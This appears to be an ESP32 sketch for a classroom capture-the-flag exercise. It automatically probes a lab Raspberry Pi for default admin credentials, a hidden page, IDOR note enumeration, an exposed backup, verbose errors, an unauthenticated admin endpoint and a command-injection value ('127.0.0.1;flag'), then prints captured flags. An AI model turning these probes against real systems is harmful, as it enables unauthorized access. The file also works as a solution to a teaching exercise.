// ctf_flag_prober.ino
// Classroom CTF tool: connects to the event Wi-Fi and automatically tries
// each known vulnerability pattern against the target Raspberry Pi, printing
// any flag it captures. No coding, no manual exploitation -- flash it and
// watch the Console. See CLASSROOM-CTF-EVENT-en.md for the full exercise.

#include <WiFi.h>
#include <HTTPClient.h>

String targetSsid, targetPass, targetIP;
bool provisioned = false;

void checkFlag(const char* label, const String& body) {
  int start = body.indexOf("FLAG{");
  if (start < 0) {
    Serial.printf("  [ -- ] %s: no flag found\n", label);
    return;
  }
  int end = body.indexOf('}', start);
  String flag = (end > start) ? body.substring(start, end + 1) : body.substring(start);
  Serial.printf("  [FOUND] %s: %s\n", label, flag.c_str());
}

String base() {
  return "http://" + targetIP + ":8080";
}

void tryDefaultCreds() {
  HTTPClient http;
  http.begin(base() + "/login");
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");
  int code = http.POST("username=admin&password=admin");
  checkFlag("#1 Default admin credentials", http.getString());
  http.end();
}

void tryHiddenPage() {
  HTTPClient http;
  http.begin(base() + "/hidden");
  http.GET();
  checkFlag("#2 Hidden unlinked page", http.getString());
  http.end();
}

void tryIDOR() {
  for (int id = 1; id <= 5; id++) {
    HTTPClient http;
    http.begin(base() + "/api/note?id=" + String(id));
    http.GET();
    String body = http.getString();
    http.end();
    if (body.indexOf("FLAG{") >= 0) {
      checkFlag(("#3 IDOR (note id=" + String(id) + ")").c_str(), body);
      return;
    }
  }
  Serial.println("  [ -- ] #3 IDOR: no flag found in notes 1-5");
}

void tryExposedBackup() {
  HTTPClient http;
  http.begin(base() + "/backup.zip");
  http.GET();
  checkFlag("#4 Exposed backup file", http.getString());
  http.end();
}

void tryVerboseError() {
  HTTPClient http;
  http.begin(base() + "/api/divide?a=1&b=0");
  http.GET(); // expected to come back as HTTP 500 -- the body is what matters
  checkFlag("#5 Verbose error disclosure", http.getString());
  http.end();
}

void tryUnauthAdmin() {
  HTTPClient http;
  http.begin(base() + "/api/admin/reset");
  int code = http.POST("");
  checkFlag("#6 Unauthenticated admin endpoint", http.getString());
  http.end();
}

void trySimInjection() {
  HTTPClient http;
  http.begin(base() + "/api/ping?host=" + String("127.0.0.1;flag"));
  http.GET();
  checkFlag("#7 Simulated command injection", http.getString());
  http.end();
}

void runAllChecks() {
  Serial.println("\n--- Trying every known vulnerability pattern ---");
  tryDefaultCreds();
  tryHiddenPage();
  tryIDOR();
  tryExposedBackup();
  tryVerboseError();
  tryUnauthAdmin();
  trySimInjection();
  Serial.println("--- Done. Copy any FOUND flag into the site's scoreboard. ---");
}

void connectAndProbe() {
  Serial.printf("\nConnecting to \"%s\" ...\n", targetSsid.c_str());
  WiFi.mode(WIFI_STA);
  WiFi.begin(targetSsid.c_str(), targetPass.c_str());

  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 20000) {
    delay(300);
    Serial.print(".");
  }

  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("\nCouldn't connect -- check the network name/password and send it again.");
    return;
  }

  Serial.printf("\nConnected. Target: %s\n", targetIP.c_str());
  runAllChecks();
  provisioned = true;
}

void setup() {
  Serial.begin(115200);
  delay(300);
  Serial.println("\n=== CTF Flag Prober ===");
  Serial.println("Send: SSID,PASSWORD,TARGET_IP");
  Serial.println("(the flashing page's \"Send to Board\" form does this for you)");
}

void loop() {
  if (!provisioned && Serial.available()) {
    String line = Serial.readStringUntil('\n');
    line.trim();
    int c1 = line.indexOf(',');
    int c2 = line.indexOf(',', c1 + 1);
    if (c1 > 0 && c2 > c1) {
      targetSsid = line.substring(0, c1);
      targetPass = line.substring(c1 + 1, c2);
      targetIP = line.substring(c2 + 1);
      targetIP.trim();
      connectAndProbe();
    } else {
      Serial.println("Expected format: SSID,PASSWORD,TARGET_IP");
    }
  }
}
